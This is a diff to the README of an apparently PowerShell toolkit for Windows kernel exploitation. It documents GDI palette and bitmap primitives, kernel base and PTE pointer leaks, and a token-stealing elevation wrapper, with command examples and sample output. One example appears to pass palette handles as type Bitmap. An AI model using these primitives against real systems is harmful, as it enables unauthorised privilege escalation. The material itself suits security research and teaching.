@@ -122,6 +122,25 @@ bcdedit /dbgsettings SERIAL DEBUGPORT:1 BAUDRATE:115200
 
 ## Kernel Helper Functions
 
+### Stage-HmValidateHandlePalette
+Universal x64 Palette leak using HmValidateHandle. Includes tagTHREADINFO pointer to facilitate low integrity EPROCESS leak.
+
+Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2, 10 RS3
+
+```
+PS C:\Users\b33f> Stage-HmValidateHandlePalette
+
+tagTHREADINFO    : -6813887409648
+cEntries         : -6813890109412
+pFirstColor      : -6813890109320
+PaletteKernelObj : -6813890109440
+PaletteHandle    : 1007159191
+
+PS C:\Users\b33f> $Manager = Stage-HmValidateHandlePalette
+PS C:\Users\b33f> "{0:X}" -f $Manager.pFirstColor
+FFFFF9CD84802078
+```
+
 ### Get-Handles
 
 Use NtQuerySystemInformation::SystemHandleInformation to get a list of open handles in the specified process.
@@ -151,16 +170,16 @@ Pointer-Leak is a wrapper for various types of pointer leaks, more will be added
 Methods:
 
 * NT kernel base leak through the TEB (by @Blomster81)
-  * Properties: Requires Bitmap primitive & LowIL compatible
-  * Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2
+  * Properties: Requires GDI primitive => LowIL compatible
+  * Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2, 10 RS3
 
 * PTE leak through nt!MiGetPteAddress (by @Blomster81 & @FuzzySec)
-  * Properties: RS1+ requires Bitmap primitive, NT Kernel base & LowIL compatible
-  * Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2
+  * Properties: RS1+ requires GDI primitive, NT Kernel base => LowIL compatible
+  * Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2, 10 RS3
 
 ```
 # NT Kernel base leak
-PS C:\Users\b33f> Pointer-Leak -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle -Type TebNtBase
+PS C:\Users\b33f> Pointer-Leak -GDIManager $ManagerBitmap.BitmapHandle -GDIWorker $WorkerBitmap.BitmapHandle -LeakType TebNtBase -GDIType Bitmap
 
 KTHREAD   : -35184359294848
 TEBBase   : 140699435483136
@@ -168,7 +187,7 @@ NtPointer : -8787002226668
 NtBase    : -8787003412480
 
 # PTE leak
-PS C:\Users\b33f> Pointer-Leak -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle -NtBase $NTLeak.NtBase -VirtualAddress 0xFFFFF78000000800 -Type MiGetPteAddress
+PS C:\Users\b33f> Pointer-Leak -GDIManager $Manager.PaletteHandle -GDIWorker $Worker.PaletteHandle -NtBase $NTLeak.NtBase -VirtualAddress 0xFFFFF78000000800 -LeakType MiGetPteAddress -GDIType Palette
 
 PTEBase    : -10445360463872
 PTEAddress : -9913858260992
@@ -286,18 +305,18 @@ C:\PS> "{0:X}" -f $BitMapObject.ManagerKernelObj
 FFFFF9010320F000
 ```
 
-### Bitmap-Elevate
+### GDI-Elevate
 
-A token stealing wrapper for x32/64 which ingests a handle to a manager and worker bitmap.
+A token stealing wrapper for x32/64 which ingests a handle to a manager and worker GDI object.
 
 Note that this function has two methods, if supplied with a pointer to an arbitrary tagTHREADINFO object it can elevate the current process from low integrity. Without the tagTHREADINFO pointer it relies on NtQuerySystemInformation (Get-LoadedModules) to leak the base address of the ntkernel which requires medium integrity on Win8.1+.
 
 ```
 # MedIL token theft
-C:\PS> Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle
+C:\PS> GDI-Elevate -GDIManager $ManagerBitmap.BitmapHandle -GDIWorker $WorkerBitmap.BitmapHandle -GDIType Bitmap
 
 # LowIL token theft
-C:\PS> Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle -ThreadInfo $ManagerBitmap.tagTHREADINFO
+C:\PS> GDI-Elevate -GDIManager $ManagerPalette.PaletteHandle -GDIWorker $WorkerPalette.PaletteHandle -GDIType Bitmap -ThreadInfo $ManagerPalette.tagTHREADINFO
 
 ```
 
